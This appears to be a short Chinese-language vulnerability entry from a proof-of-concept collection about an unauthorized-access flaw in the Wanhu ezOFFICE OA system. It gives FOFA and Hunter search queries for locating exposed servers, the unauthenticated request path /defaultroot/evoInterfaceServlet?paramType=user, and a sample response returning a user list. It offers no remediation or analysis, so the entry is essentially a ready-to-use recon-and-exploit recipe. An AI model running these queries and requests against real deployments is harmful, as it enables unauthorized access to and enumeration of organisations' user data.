# 万户 ezOFFICE 未授权访问漏洞

## 网络测绘

fofa: app="万户网络-ezOFFICE"

hunter: app.name="万户 Ezoffice OA"

## POC / EXP

```
/defaultroot/evoInterfaceServlet?paramType=user
```

```
{result:'success', data:{"userList":[]}}
```